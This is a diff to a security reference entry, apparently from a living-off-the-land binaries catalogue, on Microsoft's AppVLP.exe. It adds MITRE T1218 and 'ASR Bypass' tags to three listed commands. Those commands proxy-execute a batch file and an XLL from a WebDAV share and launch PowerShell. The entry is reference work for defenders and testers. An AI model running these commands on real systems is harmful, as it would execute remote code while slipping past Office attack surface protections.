@@ -1,16 +1,30 @@
 ---
 Name: Appvlp.exe
-Description: Execute
+Description: Application Virtualization Utility Included with Microsoft Office 2016 
 Author: ''
 Created: '2018-05-25'
-Categories: []
 Commands:
   - Command: AppVLP.exe \\webdav\calc.bat
     Description: Executes calc.bat through AppVLP.exe
+    Categories: ['Execution', 'ASR Bypass']
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows 10 w/Office 2016
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
+    Categories: ['Execution', 'ASR Bypass']
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows 10 w/Office 2016
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
+    Categories: ['Execution', 'ASR Bypass']
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows 10 w/Office 2016
 Full Path:
   - C:\Program Files\Microsoft Office\root\client\appvlp.exe
   - C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
@@ -19,4 +33,12 @@ Detection: []
 Resources:
   - https://github.com/MoooKitty/Code-Execution
   - https://twitter.com/moo_hax/status/892388990686347264
-Notes: Thanks to fab - @0rbz_ (No record), Will - @moo_hax (Code Execution)
+  - https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/
+  - https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/
+Acknowledgement:
+  - Person: fab
+    Handle: @0rbz_
+  - Person: Will
+    Handle: @moo_hax
+  - Person: Matt Wilson
+    Handle: @enigma0x3
